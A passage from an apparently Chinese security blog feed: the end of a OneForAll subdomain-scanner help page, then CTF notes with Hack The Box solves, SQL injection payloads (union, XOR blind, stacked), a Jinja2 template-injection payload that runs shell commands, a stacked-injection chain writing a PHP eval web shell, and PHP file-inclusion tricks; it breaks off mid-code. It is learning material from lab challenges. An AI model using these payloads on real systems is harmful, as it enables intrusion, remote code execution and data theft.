class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">    oneforall.py - OneForAll帮助信息</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">    oneforall.py COMMAND | --target=TARGET &lt;flags&gt;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    OneForAll是一款功能强大的子域收集工具</span><br><span class="line"></span><br><span class="line">    Example:</span><br><span class="line">        python3 oneforall.py version</span><br><span class="line">        python3 oneforall.py --target example.com run</span><br><span class="line">        python3 oneforall.py --targets ./domains.txt run</span><br><span class="line">        python3 oneforall.py --target example.com --valid None run</span><br><span class="line">        python3 oneforall.py --target example.com --brute True run</span><br><span class="line">        python3 oneforall.py --target example.com --port small run</span><br><span class="line">        python3 oneforall.py --target example.com --fmt csv run</span><br><span class="line">        python3 oneforall.py --target example.com --dns False run</span><br><span class="line">        python3 oneforall.py --target example.com --req False run</span><br><span class="line">        python3 oneforall.py --target example.com --takeover False run</span><br><span class="line">        python3 oneforall.py --target example.com --show True run</span><br><span class="line"></span><br><span class="line">    Note:</span><br><span class="line">        参数alive可选值True，False分别表示导出存活，全部子域结果</span><br><span class="line">        参数port可选值有&#x27;default&#x27;, &#x27;small&#x27;, &#x27;large&#x27;, 详见config.py配置</span><br><span class="line">        参数fmt可选格式有 &#x27;csv&#x27;,&#x27;json&#x27;</span><br><span class="line">        参数path默认None使用OneForAll结果目录生成路径</span><br><span class="line"></span><br><span class="line">ARGUMENTS</span><br><span class="line">    TARGET</span><br><span class="line">        单个域名(二选一必需参数)</span><br><span class="line">    TARGETS</span><br><span class="line">        每行一个域名的文件路径(二选一必需参数)</span><br><span class="line"></span><br><span class="line">FLAGS</span><br><span class="line">    --brute=BRUTE</span><br><span class="line">        s</span><br><span class="line">    --dns=DNS</span><br><span class="line">        DNS解析子域(默认True)</span><br><span class="line">    --req=REQ</span><br><span class="line">        HTTP请求子域(默认True)</span><br><span class="line">    --port=PORT</span><br><span class="line">        请求验证子域的端口范围(默认只探测80端口)</span><br><span class="line">    --valid=VALID</span><br><span class="line">        只导出存活的子域结果(默认False)</span><br><span class="line">    --fmt=FMT</span><br><span class="line">        结果保存格式(默认csv)</span><br><span class="line">    --path=PATH</span><br><span class="line">        结果保存路径(默认None)</span><br><span class="line">    --takeover=TAKEOVER</span><br><span class="line">        检查子域接管(默认False)</span><br></pre></td></tr></table></figure><p>扫描的结果会存两份，一份放在了csv文件之中，另一份放在了sqlite3数据库文件中了，这个数据库的用户名密码为<code>admin admin</code>，使用<code>Navicat</code>打开即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题笔记</title>
      <link href="/2021/05/28/CTF/"/>
      <url>/2021/05/28/CTF/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​本片文章主要写的内容——CTF领域内我所学到的所有方向的笔记。</p><p>​之前的博客环境与内容坏了，内容还在，不过md的内容已经永久遗失了，之后会将所有的关于CTF内容记录到此文件内，笔记的内容尽量不超过20万字，防止读者打开的速度过慢。</p><p>​之后会将从前写的文章放到百度网盘内备份，并且随着我放到我的VPS内，如果我没vps了就访问如下的GitHub的地址，不过这里面的url确实挺长的，如果你对我从前文章的内容感兴趣的话，请访问<a href="https://github.com/m4xlmum/a16n.github.io/">我从前的博客</a>，但是其实以前的内容也没啥，直接dump下来看好了。往后一定认真写博客，主要的是一定要备份，以前写的好多文章都没了，还是挺心疼的(还好备份还在)</p><ol><li>WEB——网络安全，主要考察一些web安全漏洞，包括SQL注入、xss、xxe、ssti、代码审计、反序列化安全、各种cms的漏洞等。</li><li>MISC——杂项，考察内容覆盖广泛，主要包含隐写术、古典密码学、压缩包、图片、编码、取证等方面。</li><li>REVERSE——逆向工程，主要考察软件破解与软件算法逆向。有时会涉及软件脱壳与动态调试。</li><li>MOBILE——移动安全，类似于逆向工程，主要考察软件破解、算法逆向、脱壳与动态调试。</li><li>CRYPTO——密码学，以”XX学”命名的肯定很难啦，主要方向有古典密码、现代密码，现代密码又可以分为流密码、分组密码、公钥密码等。</li></ol><h1 id="Hack-The-Box"><a href="#Hack-The-Box" class="headerlink" title="Hack The Box"></a>Hack The Box</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>夹杂在众多CTF题目中的多股清流，下面分为WEB、MISC这些类的都是题目比较杂、比较多的平台上的总结。再分几个比较小的平台的写，这是第一个，界面超炫酷的HTB。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="快速传参-Emdee-five-for-life"><a href="#快速传参-Emdee-five-for-life" class="headerlink" title="快速传参-Emdee five for life"></a>快速传参-Emdee five for life</h3><p><img src="/2021/05/28/CTF//image-20210602225736815.png" alt="image-20210602225736815"></p><p><img src="/2021/05/28/CTF//image-20210602225914557.png" alt="image-20210602225914557"></p><p>第一关太简单了（一看就知道这不就是签到题嘛，靠的就是写脚本，快速传参吧），本来都懒得写了，但是本着做做也无所谓的念头还是写了个简单的脚本来搞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://46.101.33.243:31878/&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">resp = session.get(url).text</span><br><span class="line">res = BeautifulSoup(resp, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">dmd5 = res.find(<span class="string">&#x27;h3&#x27;</span>).text  <span class="comment"># 使用bs4解析网页数据</span></span><br><span class="line">ymd5 = md5(dmd5.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">resp2 = session.post(url, data=&#123;<span class="string">&#x27;hash&#x27;</span>: ymd5&#125;).text</span><br><span class="line"><span class="built_in">print</span>(BeautifulSoup(resp2, <span class="string">&#x27;lxml&#x27;</span>).find(<span class="string">&#x27;p&#x27;</span>).text)</span><br><span class="line"><span class="comment"># HTB&#123;N1c3_ScrIpt1nG_B0i!&#125;</span></span><br></pre></td></tr></table></figure><p>稍微优化了一下下呀。</p><p><img src="/2021/05/28/CTF//image-20210602232640054.png" alt="炫酷的界面"></p><h3 id="SSTI、Jinja2-Templated"><a href="#SSTI、Jinja2-Templated" class="headerlink" title="SSTI、Jinja2-Templated"></a>SSTI、Jinja2-Templated</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site still under construction</span><br><span class="line">Proudly powered by Flask/Jinja2</span><br></pre></td></tr></table></figure><p>开局给的提示，用的python的flask写的，这很明显的ssti漏洞，而且还是Jinja2的。</p><p>ssti但是没有给注入点提示啊，给个<code>id=1</code>也好啊，这种情况我也么啥好用的工具，只好看看wp，原来直接<code>/&#123;&#123;7+7&#125;&#125;</code>就行了，然后就是Jinja2的专用payload了，一般这些ssti的payload都是相似的，所以总结一下。</p><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>class是本类、mro是父类、subclasses是子类集合，这里的子类是<code>186</code>里面有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>似乎是。</p><p><img src="/2021/05/28/CTF//image-20210602234813169.png" alt="image-20210602234813169"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTB&#123;t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!&#125;</span><br></pre></td></tr></table></figure><h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入常用函数与知识点"><a href="#SQL注入常用函数与知识点" class="headerlink" title="SQL注入常用函数与知识点"></a>SQL注入常用函数与知识点</h3><h4 id="字符串提取-substr、mid"><a href="#字符串提取-substr、mid" class="headerlink" title="字符串提取(substr、mid)"></a>字符串提取(substr、mid)</h4><table><thead><tr><th>函数名称</th><th>函数使用</th><th>函数功能</th><th>详细链接</th></tr></thead><tbody><tr><td>substr</td><td>substr()</td><td></td><td></td></tr><tr><td>mid</td><td>mid(“text”,1,1)</td><td>返回t，第一个1表示起始位置，第二个1表示截取长度</td><td><a href="https://www.w3school.com.cn/sql/sql_func_mid.asp">MID使用</a></td></tr></tbody></table><p><img src="/2021/05/28/CTF//image-20210601161051184.png" alt="mid方法"></p><h3 id="SQL注入的类型"><a href="#SQL注入的类型" class="headerlink" title="SQL注入的类型"></a>SQL注入的类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>二次注入就是在一个地方进行数据库插入，另一个地方进行数据库数据的取出，插入时可能对注入进行了过滤啥的，但是取出的时候没进行过滤，就能执行我们想要插入的恶意代码了。</p><p>但是这个注入的断定是比较难的，因为要对两个不同的位置进行联合测试，应该是所有注入类型中最难找到的了，实战中我们往往会错过这类注入点。</p><p>这类注入点没有特定的payload，往往与下面的各种注入类型交叉使用。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>一般分为<code>单引号</code>、<code>双引号</code>的字符型联合注入，和数字型联合注入。</p><p>联合查询注入现在实战应用中已经很少了，这种是没有什么难度的。</p><h4 id="盲注-时间盲注、布尔盲注"><a href="#盲注-时间盲注、布尔盲注" class="headerlink" title="盲注(时间盲注、布尔盲注)"></a>盲注(时间盲注、布尔盲注)</h4><h4 id="异或盲注"><a href="#异或盲注" class="headerlink" title="异或盲注"></a>异或盲注</h4><h4 id="形成原理与payload"><a href="#形成原理与payload" class="headerlink" title="形成原理与payload"></a>形成原理与payload</h4><p><strong>盲注的形成原理都是相同的，不存在返回值，或者只存在对于错的返回值这种，但是我们插入进去的SQL语句又实实在在是起到了作用了的就能使用盲注来进行获取数据信息。</strong></p><p>这里主要再说一下异或盲注的形成原理与payload，异或注入的表现为<code>?id=1^1^1</code>返回的是<code>?id=1</code>的内容、<code>?id=1^0^1</code>返回的是<code>?id=0</code>的内容。这样就能借助SQL里面的一些方法来获取数据库里面的数据信息啦。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1</span><br></pre></td></tr></table></figure><p>不断变换<code>database()</code>处为我们想注入的SQL语句、后面第一个1是第几个字母、后面的32为字母的值。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><h5 id="简单介绍与一般payload"><a href="#简单介绍与一般payload" class="headerlink" title="简单介绍与一般payload"></a>简单介绍与一般payload</h5><p>堆叠注入是利用<code>;</code>隔开几个查询语句，使得几个查询语句都可以进行，从而进行SQL注入。危险的SQL语句一般为<code>mysql_multi_query()</code>，因为<code>mysql_multi_query()</code> 支持多条sql语句同时执行，每个SQL语句使用<code>;</code>分隔即可分别执行。</p><p>没有固定的payload一般payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;<span class="comment">--+</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;--+</span></span><br><span class="line"><span class="string">1&quot;;show databases;--+</span></span><br></pre></td></tr></table></figure><p>但是实战时只是用上面的语句的可能性几乎为零，而且这个似乎只是php的这个<code>mysql_multi_query()</code>语句的特性，而实战时几乎好多都是jsp、asp等老网页，也是比较安全的(一定是我现在太菜了，还没开始学jsp、asp的原因才会觉得这两种语言写的网页安全)。</p><h4 id="绕过限制Bypass"><a href="#绕过限制Bypass" class="headerlink" title="绕过限制Bypass"></a>绕过限制Bypass</h4><p>基于上面的几种注入又各自有不同的绕过限制的方法，上面的几种注入只是我们使用SQL注入的大纲，但是更重要的是各种限制的绕过，比如说禁用了单双引号，也许可以想想使用<code>\</code>来转义单双引号来绕过限制等等。</p><hr><h3 id="二次注入-1"><a href="#二次注入-1" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h4><p><strong>TAG:二次注入、联合查询注入</strong></p><p>给出的有两个功能，一个注册登录、一个修改密码的功能(查询的是用户名)</p><p>先使用下面的payload进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = 1&#x27; union select database() #</span><br></pre></td></tr></table></figure><p>password可以自己随便设置，直接登录即可发现数据已经注出来了。</p><p><img src="/2021/05/28/CTF//image-20210604235055344.png" alt="image-20210604235055344"></p><p>这题不是盲注就不用使用脚本了，直接贴出所有的payload，直接注册登录就能查询到信息了。</p><p><strong>爆数据表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210604235538363.png" alt="image-20210604235538363"></p><p><strong>爆列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; #</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210604235738874.png" alt="image-20210604235738874"></p><p><strong>获取数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select * from flag #</span><br></pre></td></tr></table></figure><p><img src="/2021/05/28/CTF//image-20210604235837283.png" alt="image-20210604235837283"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fd2e5523-e1d1-4f17-aa7a-a85142ff023f&#125;</span><br></pre></td></tr></table></figure><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="sql注入getshell、-SUCTF-2018-MultiSQL"><a href="#sql注入getshell、-SUCTF-2018-MultiSQL" class="headerlink" title="sql注入getshell、[SUCTF 2018]MultiSQL"></a>sql注入getshell、[SUCTF 2018]MultiSQL</h4><p>这个给出的是一个小网站，有登录、注册、查看个人信息、上传个人头像等功能。</p><p><img src="/2021/05/28/CTF//image-20210601150932381.png" alt="image-20210601150932381"></p><p>根据上面的这个payload确认这里是存在SQL注入漏洞的，而且还是异或注入。可以用下面的payload自行进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn/user/user.php?id=1^0^1</span><br><span class="line">http://3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn/user/user.php?id=1^1^1</span><br></pre></td></tr></table></figure><p>然后接下去继续测试注入，但是substr似乎是被过滤掉了，这里考虑使用mid来替代substr</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3f3e9d3e-bd6c-4320-b900-9edda3805fd1.node3.buuoj.cn/user/user.php?id=1^(if(ascii(mid(database(),1,1))&gt;32,1,0))^1</span><br></pre></td></tr></table></figure><p>这里不仅仅有异或注入，还有堆叠注入，直使用下面的payload也是没有报错的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;</span><br></pre></td></tr></table></figure><p>然后就是堆叠注入用<code>select into outfile</code>写入shell，这是一个php做的网站，所以可以用下面的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[4]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span></span><br><span class="line">res = <span class="string">&quot;char(&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">    res += <span class="built_in">str</span>(<span class="built_in">ord</span>(payload[i])) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res[:<span class="built_in">len</span>(res) - <span class="number">1</span>] + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="comment"># char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,52,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用sql的预处理来写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">set</span> <span class="variable">@payload</span><span class="operator">=</span><span class="type">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">60</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">40</span>,<span class="number">36</span>,<span class="number">95</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">91</span>,<span class="number">52</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">59</span>,<span class="number">63</span>,<span class="number">62</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">47</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">109</span>,<span class="number">108</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">39</span>,<span class="number">59</span>);<span class="keyword">prepare</span> shell <span class="keyword">from</span> <span class="variable">@payload</span>;<span class="keyword">execute</span> shell;</span><br></pre></td></tr></table></figure><p>预处理的实验</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@payload</span><span class="operator">=</span><span class="type">char</span>(<span class="number">83</span>,<span class="number">72</span>,<span class="number">79</span>,<span class="number">87</span>,<span class="number">32</span>,<span class="number">68</span>,<span class="number">65</span>,<span class="number">84</span>,<span class="number">65</span>,<span class="number">66</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">59</span>);</span><br><span class="line"><span class="keyword">PREPARE</span> i <span class="keyword">FROM</span> <span class="variable">@payload</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> i;</span><br></pre></td></tr></table></figure><p>只是不知道为什么执行成功了，但是没有返回数据库的信息，只显示了查询出了多少行。</p><p>执行上面的payload之后在这里找shell<code>/favicon/shell.php</code>，蚁剑连接shell即可。</p><p><img src="/2021/05/28/CTF//image-20210601175949497.png" alt="image-20210601175949497"></p><p><img src="/2021/05/28/CTF//image-20210601180101679.png" alt="找到flag即可"></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SSTI全名为服务端模板注入。</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p><a href="https://blog.csdn.net/qq_19381989/article/details/103175728">Jinja2模板注入的总结文CSDN</a></p><ol><li>第一个Jinja2，较为常见的。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123; &quot;&quot;.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;cat flag.txt&quot;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>php可以说现在是一般的中等比赛上面都会出的一种简单的题目了，因为php相关的知识点繁多复杂，所以这里列出了php的知识点与题目两个分类，将知识点列为一个单独分类的目的就是未来比赛的时候找知识点的时候方便查找，而不是随即再去百度，减少一些不必要的麻烦。</p></blockquote><h3 id="PHP知识点"><a href="#PHP知识点" class="headerlink" title="PHP知识点"></a>PHP知识点</h3><h4 id="php短标签绕过"><a href="#php短标签绕过" class="headerlink" title="php短标签绕过"></a>php短标签绕过</h4><p>这个绕过的是对<code>php</code>这个关键字或者<code>&lt;?php</code>这个关键字有限制的情况，<code>&lt;?php ?&gt;</code>这个叫做长标签，而<code>&lt;? ?&gt;</code>叫做短标签。</p><h4 id="php空格绕过"><a href="#php空格绕过" class="headerlink" title="php空格绕过"></a>php空格绕过</h4><ol><li>限制了空格的使用的情况下可以使用php的<code>%09</code>来代替。因为在ASCII码制中<code>0x09</code>代表的是水平制表符，也就是转义的<code>\t</code>，当然直接用<code>\t</code>可能也是可以的，分情况而论都试一下就好了。</li></ol><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ol><li>反引号在php中可以命令执行，但是在双引号内反引号引住的内容好像不能被执行，其余情况下反引号的作用相当于<code>shell_exec()</code>，当关闭<code>shell_exec()</code>这个函数的时候，反引号也将不再起作用。</li></ol><h4 id="伪协议读文件"><a href="#伪协议读文件" class="headerlink" title="伪协议读文件"></a>伪协议读文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.?file=data:text/plain,&lt;?php phpinfo()?&gt;                          #GET数据</span><br><span class="line">2.?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=            #后面的base64字符是需要传入的字符串的base64编码</span><br><span class="line">3.?file=php://input [POST DATA:]&lt;?php phpinfo();?&gt;                  #POST数据</span><br><span class="line">4.?file=php://filter/read=convert.base64-encode/resource=flag.php  #get读源码</span><br><span class="line">5.?file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php   #其他编码读源码</span><br></pre></td></tr></table></figure><h4 id="php中array赋值失败绕过"><a href="#php中array赋值失败绕过" class="headerlink" title="php中array赋值失败绕过"></a>php中array赋值失败绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$array</span>[<span class="number">9223372036854775807</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>[] = <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回值为1 NULL</span></span><br></pre></td></tr></table></figure><p>可见第二次给数组赋值失败，因为默认似乎是给这个数值<code>9223372036854775807</code>加一进行赋值的，但是又超过最大值了，所以会赋值失败。可用于以下的情况的绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此种情况下只需要将$a的值赋为9223372036854775807即可。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$array</span>[<span class="variable">$a</span>]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$array</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;绕过失败！&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;绕过成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="php死亡退出"><a href="#php死亡退出" class="headerlink" title="php死亡退出"></a>php死亡退出</h4><p>例子如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|iconv|base64|htaccess|log|sess/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;nonononono!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$g</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;xxx&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">filter</span>(<span class="variable">$g</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$g</span>);</span><br><span class="line"><span 